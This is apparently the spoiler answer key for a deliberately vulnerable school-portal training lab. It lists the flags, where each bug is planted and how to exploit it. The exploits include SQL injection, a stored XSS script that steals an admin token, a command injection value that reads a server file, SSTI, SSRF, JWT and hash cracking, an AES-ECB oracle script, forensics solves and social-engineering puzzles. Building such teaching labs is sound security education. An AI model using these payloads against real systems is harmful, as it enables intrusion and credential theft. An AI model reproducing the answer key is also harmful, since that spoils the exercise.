# Solutions (spoilers)

> This is the answer key. It holds the plaintext flags, where each one is
> planted, and how to exploit it. It is kept deep in `docs/.internal/` so you
> don't stumble on it. If you are here to hunt the bugs yourself, turn back now.

Every flag uses leetspeak inside the braces (`a→4`, `e→3`, `i→1`, `o→0`, and
sometimes `s→5`), for example `MFANO{c4n_h4ck_f0r_r34l}`. Older plain-English
flags are no longer valid and return `wrong flag`.

All demo logins: students `MHS1001`–`MHS1030` / `Student@123`, admin `admin` /
`Mfano@Admin2026`. The app is at <http://127.0.0.1:8080>.

---

## Phase 1 — Web + Linux files (Easy)

### P1-01 · IDOR report download · A01 · `MFANO{1d0r_r3p0rt5_4r3_n0t_pr1v4t3}`
- **Where:** `portal/student.py` `report()` fetches `report_<sid>.html` by the
  `sid` query param with no ownership check. The flag is in `MHS1013`'s report
  (seeded via the `remark` column in `seed.py`).
- **Exploit:** log in as any student, open *Download report*, then change `sid`
  in the URL (`/student/report?sid=<id>`) to another student's id. The id of
  `MHS1013` is the one carrying the flag in the head-teacher remark.
- **Hint to give yourself:** *look at what the report leaks, and whose report
  you are actually allowed to see.*

### P1-02 · Unprotected ops console · A01 · `MFANO{unl1nk3d_1s_n0t_pr0t3ct3d}`
- **Where:** `portal/ops.py` serves `/ops/students` with no `login_required`.
  The clue is an HTML comment in every report footer (`portal/reports.py`).
- **Exploit:** read the report source (or the on-disk report files) → find
  `/ops/students` → open it with no login. The token is on the page.
- **Hint:** *not everything is linked in the menu.*

### P1-03 · Readable files on the box · A02 · `MFANO{ls_c4t_gr3p_f1nd_th3_tr41l}`
- **Where:** `seed.py` `write_reports()` drops `ADMIN_NOTES.txt` into the
  world-readable reports dir (`/srv/mfano/reports` in the container).
- **Exploit:** `python labctl.py shell`, then
  `grep -r MFANO /srv/mfano` or `cat /srv/mfano/reports/ADMIN_NOTES.txt`.
- **Hint:** *explore the filesystem with `ls`, `cat`, `find`, `grep`.*

## Phase 2 — Networking (Easy–Medium)

### P2-01 · Weak backup DB password · A02 · `MFANO{d3f4ult_cr3ds_0p3n_th3_b4ckup}`
- **Where:** `docker-compose.yml` `backupdb` uses `POSTGRES_PASSWORD=postgres`.
  The flag is in the `backup_notes` table (`services/backup/init.sql`).
- **Exploit:** `nmap -sV 127.0.0.1` shows 5432, then
  `psql "postgresql://mfano:postgres@127.0.0.1:5432/results_backup" -c
  "SELECT note FROM backup_notes;"`.
- **Hint:** *default passwords on backups.*

### P2-02 · Trusting the internal network · A02 · `MFANO{1nt3rn4l_d03s_n0t_m34n_s4f3}`
- **Where:** `services/grading/app.py` `/internal/metadata` returns an access
  token to any caller, no auth. The service is not published to the host.
- **Exploit:** from inside the lab network (or via the Phase 4 SSRF), hit
  `http://grading:9000/internal/metadata`.
- **Hint:** *"internal only" is not the same as protected.*

## Phase 3 — Core web (Medium)

### P3-01 · SQL injection · A05 · `MFANO{un10n_s3l3ct_th3_st4ff_v4ult}`
- **Where:** `portal/student.py` `search()` concatenates `q` into the SQL. The
  flag is in `staff_secrets.secret` (seeded in `seed.py`).
- **Exploit:** in *Find classmate*, search
  `zzz%' UNION SELECT label, secret FROM staff_secrets --`.
- **Hint:** *the search box builds its query the lazy way; two columns come
  back.*

### P3-02 · Stored XSS → admin token · A05 · `MFANO{st0r3d_scr1pt_st0l3_th3_r3v13w_t0k3n}`
- **Where:** `portal/admin.py` `student_review()` renders `about` with `|safe`.
  The flag is behind the admin-only `/admin/review-token`.
- **Exploit:** set your profile *About me* to
  `<script>fetch('/admin/review-token').then(r=>r.text()).then(t=>new Image().src='/x?'+btoa(t))</script>`,
  then the admin opens your review page and the script runs as admin. (For a
  quick check, log in as admin and open `/admin/review-token` directly.)
- **Hint:** *what you type in your profile runs in whose browser?*

### P3-03 · Forgeable role cookie · A07 · `MFANO{uns1gn3d_c00k13_m4d3_m3_4dm1n}`
- **Where:** `portal/auth.py` sets a plaintext `mfano_role` cookie;
  `portal/admin.py` `console()` trusts it instead of the signed session.
- **Exploit:** log in as a student, edit the `mfano_role` cookie to `admin`,
  open `/admin/console`.
- **Hint:** *which cookie is signed, and which one is just text?*

### P3-04 · Marks tamper via client role · A01 · `MFANO{cl13nt_s41d_4dm1n_s0_m4rks_ch4ng3d}`
- **Where:** `portal/student.py` `update_marks()` authorises on a client-sent
  `role` field.
- **Exploit:**
  `curl -b cookie.txt -d 'role=admin&subject=Mathematics&term=2026 Term 1&score=100'
  http://127.0.0.1:8080/student/marks/update`.
- **Hint:** *the server believes you when you say you are admin.*

## Phase 4 — Reaching the server (Hard)

### P4-01 · Command injection · A05 · `MFANO{s3m1c0l0n_r34ch3d_th3_sh3ll}`
- **Where:** `portal/admin.py` `ping()` runs `ping -c 1 <host>` with
  `shell=True`. Flag planted at `/srv/mfano/server.flag` (`seed.py`).
- **Exploit:** admin *Tools → Ping*, host =
  `127.0.0.1; cat /srv/mfano/server.flag`.
- **Hint:** *where does the host string end up?*

### P4-02 · Upload → SSTI code exec · A02 · `MFANO{upl04d3d_scr1pt_r4n_0n_th3_s3rv3r}`
- **Where:** `portal/admin.py` `upload()` saves any file; `preview()` renders it
  with `render_template_string`. Flag is `config['SERVER_FLAG']`.
- **Exploit:** upload a file containing `{{ config['SERVER_FLAG'] }}`, then open
  `/admin/tools/preview?name=<file>`.
- **Hint:** *the preview renders your file as a template.*

### P4-03 · SSRF to grading service · A01 · `MFANO{ssrf_r34ch3d_th3_gr4d1ng_s3rv1c3}`
- **Where:** `portal/admin.py` `import_logo()` fetches any URL. Flag at grading
  `/internal/logo-config` (`services/grading/app.py`).
- **Exploit:** admin *Tools → Import logo*, URL =
  `http://grading:9000/internal/logo-config`.
- **Hint:** *the fetcher does not care where the URL points.*

### P4-04 · Payment tamper · A01 · `MFANO{p41d_n0th1ng_f33s_cl34r3d}`
- **Where:** `portal/payments.py` `pay()` trusts the client `amount`/`status`.
- **Exploit:** on the payments page, *Pay now* with amount = your full balance
  (no real payment). The JSON response carries the flag when the balance hits 0.
- **Hint:** *who decides how much you paid?*

## Phase 5 — Secrets and supply chain (Medium–Hard)

### P5-01 · Secret in frontend · A04 · `MFANO{fr0nt3nd_k3y_0p3n3d_th3_t1ll}`
- **Where:** `portal/static/payment.js` ships a `secretKey`.
- **Exploit:** open the payments page, View Source → `payment.js`, or
  `curl http://127.0.0.1:8080/static/payment.js`.
- **Hint:** *client code is downloaded to every browser.*

### P5-02 · Secret in git history · A04 · `MFANO{g1t_h1st0ry_n3v3r_f0rg3ts}`
- **Where:** `deploy/secrets.env`. It was added and removed twice. The first
  copy holds an old plain-English secret marked as rotated, which is now a
  decoy (`wrong flag`). The second copy, labelled "rotate", holds the real flag.
- **Exploit:** `git log -p --full-history -- deploy/secrets.env`,
  `git log -p -S g1t_h1st0ry`, or `gitleaks detect`. Take the newest secret.
  `--full-history` matters: each add is undone by a later remove, so after the
  phase branches were merged a plain `git log -- deploy/secrets.env` prints
  nothing (history simplification).
- **Hint:** *the latest tree is clean; the history is not.*

### P5-03 · Outdated dependency · A03 · `MFANO{p1p_4ud1t_f0und_th3_0ld_r3qu3sts}`
- **Where:** `requirements.txt` pins `requests==2.19.1`.
- **Exploit:** `python labctl.py audit` (or `pip-audit -r requirements.txt`). The
  flag prints only when pip-audit actually reports the vulnerable pin.
- **Hint:** *detection, not exploitation. Read the advisory.*

### P5-04 · Leaky error page · A10 · `MFANO{st4ck_tr4c3_t0ld_3v3ryth1ng}`
- **Where:** debug mode on (`MFANO_DEBUG=1`); `portal/diagnostics.py`
  `self-test` raises with the build token in the message.
- **Exploit:** open `http://127.0.0.1:8080/diagnostics/self-test?load=0`; the
  interactive traceback shows the message with the token.
- **Hint:** *make it crash and read the stack trace.*

## Phase 5b — Cryptography (Medium–Hard)

Each flag falls out of *breaking* the crypto at runtime, never from reading the
source. Demo student `MHS1007` / `Student@123` reaches every entry point.

### P5B-01 · Weak password hashing (unsalted MD5) · A04 · `MFANO{md5_cr4ck3d_th3_st4ff_h4sh}`
- **Where:** `seed.py` seeds `legacy_staff` with `jmwangi` whose password is
  stored as unsalted MD5 `c378985d629e99a4e86213db0cd5e70d`. `portal/crypto.py`
  `staff_login()` verifies the password as `md5(pw)`. The flag is a constant in
  `crypto.py`, shown only after a successful login — it is *not* in the table,
  so the SQLi that leaks the hash cannot also leak the flag.
- **Exploit:**
  1. Leak the hash through the Phase-3 SQL injection in `/student/search`
     (two columns), e.g.
     `/student/search?q=zzz%25' UNION SELECT username, md5_password FROM legacy_staff-- -`
     → `jmwangi:c378985d629e99a4e86213db0cd5e70d`.
  2. Crack it against a wordlist:
     `echo c378985d629e99a4e86213db0cd5e70d > h.txt`
     `hashcat -m 0 h.txt /usr/share/wordlists/rockyou.txt` (or
     `john --format=raw-md5 --wordlist=rockyou.txt h.txt`) → **`chocolate`**.
  3. Log in at `/staff/login` as `jmwangi` / `chocolate`. The page shows the flag.
- **Hint:** *the hash is unsalted and the password is an ordinary word.*

### P5B-02 · Fake encryption (base64) · A04 · `MFANO{b4s3_s1xtyf0ur_1s_n0t_crypt0}`
- **Where:** `portal/crypto.py` sets the `mfano_vault` cookie on the student
  dashboard to `VAULT_COOKIE_B64`, labelled an "AES-wrapped locker token". It is
  only base64 — encoding, not encryption.
- **Exploit:** log in as a student, read the `mfano_vault` cookie (DevTools →
  Application → Cookies, or `curl -c jar -b jar`), then
  `echo 'TUZBTk97YjRzM19zMXh0eWYwdXJfMXNfbjB0X2NyeXB0MH0=' | base64 -d`.
- **Hint:** *that is not ciphertext — try decoding it.*

### P5B-03 · Weak token signing (JWT) · A07 · `MFANO{w34k_jwt_s3cr3t_f0rg3d_4dm1n}`
- **Where:** `portal/crypto.py` issues the `mfano_api` JWT (HS256) signed with
  the weak secret **`mfano123`**, carrying `role: "student"`. `/api/exam-key`
  returns the flag only when the token's `role` is `admin`.
- **Exploit:**
  1. Grab your `mfano_api` token (student dashboard cookie).
  2. Crack the secret: `hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt`
     or `jwt_tool <token> -C -d rockyou.txt` → **`mfano123`**.
  3. Forge an admin token with that secret, e.g.
     `jwt_tool <token> -S hs256 -p 'mfano123' -T` (set `role` to `admin`), or in
     Python with the repo helper:
     `python -c "from portal.cryptolib import jwt_encode; print(jwt_encode({'sub':'MHS1007','role':'admin'},'mfano123'))"`.
  4. `curl -H "Authorization: Bearer <forged>" http://127.0.0.1:8080/api/exam-key`
     → the flag. A student token gets `403`.
- **Hint:** *the signature is real HMAC; the secret is guessable.*

### P5B-04 · Hardcoded key · A04 · `MFANO{h4rdc0d3d_k3y_1s_n0t_s3cr3t}`
- **Where:** `portal/static/app.config.js` ships, side by side, the AES-128-CBC
  `keyHex` `0f1e2d3c4b5a69788796a5b4c3d2e1f0` and the
  `encryptedTranscript` = base64(IV‖ciphertext). A key shipped with the
  ciphertext is not a secret.
- **Exploit:** `curl http://127.0.0.1:8080/static/app.config.js`, then decrypt
  (IV is the first 16 bytes of the blob):
  ```sh
  echo 'ABEiM0RVZneImaq7zN3u/zZq3RYslyRepYavVAOlBbh+iLPcq610DptUyeh4UcXZ0dq4EnXt/FMxcSVth4sh9g==' \
    | base64 -d | tail -c +17 \
    | openssl enc -d -aes-128-cbc -K 0f1e2d3c4b5a69788796a5b4c3d2e1f0 \
        -iv 00112233445566778899aabbccddeeff
  ```
  (or CyberChef: *From Base64* → *AES Decrypt*, CBC, key hex, IV = first block.)
- **Hint:** *the key is in the file you just downloaded.*

### P5B-05 · ECB mode leak · A04 · `MFANO{3cb_r3p34ts_g1v3_1t_4w4y}`
- **Where:** `portal/crypto.py` `/api/seal?q=<base64>` returns
  `AES-ECB(key, your_bytes ‖ secret_flag)` as hex, with a key random per process.
  ECB maps equal 16-byte plaintext blocks to equal ciphertext blocks, so the
  appended secret can be peeled off a byte at a time (CryptoPals #12).
- **Exploit:** confirm ECB first — two identical input blocks give two identical
  ciphertext blocks (`?q=` of 32 × `A`). Then byte-at-a-time recovery:
  ```python
  import base64, requests
  S = requests.Session(); S.post("http://127.0.0.1:8080/login",
      data={"username":"MHS1007","password":"Student@123"})
  oracle = lambda p: bytes.fromhex(S.get("http://127.0.0.1:8080/api/seal",
      params={"q": base64.b64encode(p).decode()}).text)
  B, out = 16, b""
  while not out.endswith(b"}"):
      pad = b"A"*(B-1-(len(out)%B)); i = len(out)//B
      tgt = oracle(pad)[i*B:(i+1)*B]
      out += bytes(b for b in range(256)
                   if oracle(pad+out+bytes([b]))[i*B:(i+1)*B]==tgt)[:1]
  print(out.decode())
  ```
- **Hint:** *same input block, same output block — lean on that.*

---

## The intended chain

Phase 1 (unprotected console) and Phase 3 (SQLi, stored XSS, forgeable cookie)
get you to admin. Admin unlocks the Phase 4 server tools, where command
injection and the upload give code execution on the box — the same box whose
filesystem you first explored in Phase 1. SSRF reaches the internal grading
service from Phase 2. Phase 5's frontend key and git-history secret are the
quiet mistakes that tie the payment flow together.

---

## Phase 7: Forensics

The generator is `docs/.internal/maintainer/answer-key/build_forensics.py` on this branch only. It uses the
standard library and is deterministic, so `python docs/.internal/maintainer/answer-key/build_forensics.py
forensics/evidence` rebuilds byte-identical files.

### F-01 · PNG metadata · `MFANO{m3t4d4t4_t3lls_th3_st0ry}`
- **Where:** `tEXt` chunk `Comment` in `01_noticeboard.png`.
- **Solve:** `exiftool 01_noticeboard.png` or `strings 01_noticeboard.png | grep MFANO`.

### F-02 · Appended ZIP · `MFANO{b1nw4lk_c4rv3d_th3_z1p}`
- **Where:** a deflated ZIP is appended after `IEND` in `02_staff_photo.png`.
- **Solve:** `binwalk -e 02_staff_photo.png` (or `unzip 02_staff_photo.png`,
  which skips the PNG prefix) and read `leaked/kcse_mock_chemistry_p1.txt`.

### F-03 · LSB steganography · `MFANO{l34st_s1gn1f1c4nt_s3cr3ts}`
- **Where:** LSB of R, G, B in turn, pixels row by row, MSB-first bytes,
  NUL-terminated (`03_prize_giving.png`).
- **Solve:** `zsteg 03_prize_giving.png` (shows up as `b1,rgb,lsb,xy`), or
  Pillow: `np.packbits(np.array(img).reshape(-1) & 1)`.

### F-04 · Hidden GIF frame · `MFANO{0n3_fr4m3_t00_f4st}`
- **Where:** frame 17 of 25 in `04_school_bell.gif`, with a 10 ms delay
  (the others use 120 ms). The GIF comment is a decoy.
- **Solve:** `ffmpeg -i 04_school_bell.gif f%02d.png` or `magick 04_school_bell.gif -coalesce f%02d.png`.

### F-05 · Morse audio · `MFANO{m0rs3_c0d3_n3v3r_d13s}`
- **Where:** 700 Hz Morse at 80 ms per unit with hiss: `M0RS3 C0D3 N3V3R D13S` (letters and digits).
- **Solve:** Audacity waveform by eye, or any audio Morse decoder.

### F-06 · Spectrogram · `MFANO{l00k_4t_th3_sp3ctr0gr4m}`
- **Where:** text drawn as tone bands from 3 kHz to 9 kHz under a 110 Hz hum
  and noise (`06_assembly_recording.wav`).
- **Solve:** Audacity → Spectrogram view (or Sonic Visualiser). Raise the max
  frequency to at least 10 kHz and zoom the time axis out.

### F-07 · CCTV frame · `MFANO{fr4m3_by_fr4m3_cctv}`
- **Where:** frame index 41 (0-based; `ffmpeg` writes it as `_42`) of
  `07_corridor_cctv.avi`, at 02:13:04. The INFO comment hints "review every frame".
- **Solve:** `ffmpeg -i 07_corridor_cctv.avi f%02d.png`, or step frames in VLC
  (`e` key).

---

## Phase 5c — Social engineering (SEE) (Easy–Medium)

A contained awareness module on the staff **Intranet** (`/intranet`, in the
student nav). Everyone is a fake NPC, nothing sends real mail, there is no
working phishing page and no credential capture. Reach it as any student
(`MHS1007` / `Student@123`).

### SE-01 · OSINT password profiling · `MFANO{0s1nt_bu1lt_th3_p4ssw0rd}`
- **Where:** `portal/social.py`. The target NPC is **Daniel Mwaura**, username
  `d.mwaura` (directory). His public noticeboard posts give away the password:
  the dog **Simba** and birth year **1980**; a third post spells out the habit
  ("the dog + the year"). `/intranet/login` accepts `d.mwaura` / `Simba1980`.
- **Solve:**
  1. `/intranet/directory` → usernames are first-initial dot surname → `d.mwaura`.
  2. `/intranet/noticeboard` → pet `Simba`, born `1980`.
  3. `/intranet/login` as `d.mwaura` / **`Simba1980`** → flag.
- **Hint:** *people build passwords out of their public life.*

### SE-02 · Phishing spotting · `MFANO{sp0tt3d_th3_ph1sh}`
- **Where:** `portal/social.py` `INBOX` — five static samples at
  `/intranet/webmail`. Scoring is server-side (`PHISH_IDS`), so the answer is
  not on the page. The two phishing items are:
  - **#2** "URGENT: your mailbox will be CLOSED" — look-alike sender
    `admin@mfan0-support.com` (zero for the "o"), link to a `.tk` host under a
    fake subdomain, pressure/deadline.
  - **#4** "Mfano Bank — salary on hold" — fake brand, `secure-mfano-bank.tk`
    login link, two-hour deadline.
  The legitimate three (#1 exams, #3 library, #5 principal) all come from
  `@mfano.sch.ke` and link to `portal.mfano.sch.ke` with no pressure.
- **Solve:** tick **exactly #2 and #4**, submit → flag. Any other set
  (including "select all") fails.
- **Hint:** *check the sender domain, where the link really goes, and the
  urgency.*

### SE-03 · Pretext helpdesk bot · `MFANO{pr3t3xt_ch41n3d_th3_r3s3t}`
- **Where:** `portal/social.py` `_helpdesk_reply()` at `/intranet/helpdesk`. A
  rule-based, offline bot. It releases the "reset code" only after the caller
  presents the staff username from SE-01 (`d.mwaura`) **and** the security
  answer, the pet name (`Simba`) from the noticeboard. That info-chain is the
  lesson.
- **Solve (scripted path):**
  1. "I need a password reset" → bot asks for the staff username.
  2. "my username is d.mwaura" → bot asks the security question (pet's name).
  3. "Simba" → bot returns the reset code (the flag).
  Or all-in-one: *"reset for d.mwaura, pet is Simba"*. A naive demand, or a
  wrong pet, gets nothing.
- **Hint:** *chain the username and the pet answer you already found.*

### Containment note
Nothing in Phase 5c sends a message or captures a credential: the webmail items
are static strings, the helpdesk bot is a pure function of the message text, and
the fake sign-in only compares against the invented NPC password. `social.py`
imports no mail/network client (enforced by `tests/test_phase5c.py`).
